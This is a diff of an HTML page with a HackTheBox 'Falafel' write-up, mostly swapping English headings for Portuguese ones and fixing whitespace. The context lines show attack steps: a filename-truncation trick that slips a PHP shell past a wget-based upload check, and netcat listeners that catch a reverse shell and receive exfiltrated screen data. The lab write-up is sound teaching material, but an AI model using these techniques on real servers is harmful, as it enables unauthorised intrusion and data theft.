@@ -134,14 +134,13 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="Assets/HTB-Linux-Hard-Falafel/f9106389d256a42cf41619e85fbd8f01.webp" alt="" /></p>
-<h2 id="testing"><a class="header" href="#testing">Testing</a></h2>
-<h1 id="writeup-of-falafel"><a class="header" href="#writeup-of-falafel">Writeup of <em>Falafel</em></a></h1>
-<h4 id="hard-machine-hacktheboxcom"><a class="header" href="#hard-machine-hacktheboxcom">Hard machine (hackthebox.com)</a></h4>
-<h4 id="sylvain-javali-júlio---08092021"><a class="header" href="#sylvain-javali-júlio---08092021">Sylvain (Javali) Júlio - 08/09/2021</a></h4>
+                        <p><img src="Assets/HTB-Linux-Hard-Falafel/icon.webp" alt="" /></p>
+<h1 id="resolução-da-máquina-falafel"><a class="header" href="#resolução-da-máquina-falafel">Resolução da máquina <strong>Falafel</strong></a></h1>
+<h4 id="máquina-hard-hacktheboxcom"><a class="header" href="#máquina-hard-hacktheboxcom">Máquina HARD (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---09092021"><a class="header" href="#by-javalimz---09092021">by <strong><em>JavaliMZ</em></strong> - 09/09/2021</a></h4>
 <hr />
 <hr />
-<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
 <p>For enumeration, after verifying the connection, I always do a nmap scan like this:</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/allPorts.png" alt="allPorts" /></p>
@@ -273,7 +272,7 @@ main()
 </code></pre>
 <p>We can update an image with png extention. but the response is very unusual. That's look the website use &quot;wget&quot; binary for download the file. I tried change extension, MIME type, concate a command (because the server use wget) but nothing work... The way to upload is very tricky! In linux, the maximum size of a name file is 255 chars. And wget as a function that cute the name if is very long!!</p>
 <pre><code class="language-bash"># Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
-cp shell.png $(msf-pattern_create -l 251).png  
+cp shell.png $(msf-pattern_create -l 251).png
 </code></pre>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/output_wget.png" alt="Output wget" /></p>
 <p>The Output say literally the last 4 chars of the new name file is h7Ah</p>
@@ -290,8 +289,7 @@ cp shell.png $(msf-pattern_create -l 251).png
 <ul>
 <li>The file need to end with &quot;.png&quot; extension</li>
 <li>The site will interprete php code</li>
-<li>the wget of the server cut name too long and the exact offset was 232
-So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)</li>
+<li>the wget of the server cut name too long and the exact offset was 232 So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)</li>
 </ul>
 <pre><code class="language-bash">cp shell.php $(msf-pattern_create -l 232).php.png
 </code></pre>
@@ -331,7 +329,7 @@ sudo nc -lvnp 443               # On another one
    // Check connection
    if (mysqli_connect_errno())
    {
-      echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
+	  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
    }
 ?&gt;
 </code></pre>
@@ -370,7 +368,7 @@ nc -lvnp 443 &gt; screen.raw             # kali Machine
 #&gt;  I/O size (minimum/optimal): 512 bytes / 512 bytes
 #&gt;  Disklabel type: dos
 #&gt;  Disk identifier: 0x01590ad6
-#&gt;  
+#&gt;
 #&gt;  Device     Boot    Start      End  Sectors  Size Id Type
 #&gt;  /dev/sda1  *        2048 14680063 14678016    7G 83 Linux
 #&gt;  /dev/sda2       14682110 16775167  2093058 1022M  5 Extended
